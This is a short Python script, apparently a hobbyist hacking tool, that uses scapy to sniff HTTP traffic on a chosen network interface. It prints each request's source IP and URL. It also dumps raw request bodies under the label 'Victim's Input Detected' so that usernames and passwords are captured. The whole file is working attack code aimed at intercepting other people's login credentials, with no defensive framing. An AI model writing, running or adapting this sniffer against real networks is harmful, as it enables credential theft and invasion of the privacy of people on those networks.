#!usr/bin/env python
#This Script is Used to Intercept the Target Http Request
import scapy.all as sc  #Used for packet manipulation
import argparse
from scapy.layers import http   #This will Decode HTTP Packets using Content_length
from colorama import init,Fore #For Color in Display

# For Color >> Green for  Requests and Red For Username/passwd or user Input
init()
GREEN =Fore.GREEN
RED=Fore.RED

def argument():
    parse = argparse.ArgumentParser()
    parse.add_argument("-i","--interface",dest="interface",help = "Interface to Target")
    opt = parse.parse_args()
    return opt

#This Function used to sniff the Packets|process_sniff_packet is a CallBack Function 
def sniff(interface):
    sc.sniff(iface=opt.interface,store=False,prn=process_sniff_packet) #prn is a call back fuction callling the process _sniff_packet
    
#This Fuction Used to extract the Username / passwd from the Request
def login_info(packet):
    if packet.haslayer(sc.Raw): 
            return packet[sc.Raw].load 

#This is the CallBack Function.Used to get the ip<target> and URL<Target Visit>
def process_sniff_packet(packet):
    
    if packet.haslayer(http.HTTPRequest):
        url = str(packet[http.HTTPRequest].Referer) + str(packet[http.HTTPRequest].Host ) + str(packet[http.HTTPRequest].Path)
        ip = packet[sc.IP].src
        print(f"{GREEN}IP:[ {ip} ] has REQUESTED >>  \n{url}")
        
        login = login_info(packet)
        if login:
            print(f"{RED}Victim's Input Detected :{login}")
            
#For UserInput            
opt= argument()
#calling Function
print("Start Sniffing.... ")
print("\nPress CTRL+C to Quit.")
sniff(opt.interface)
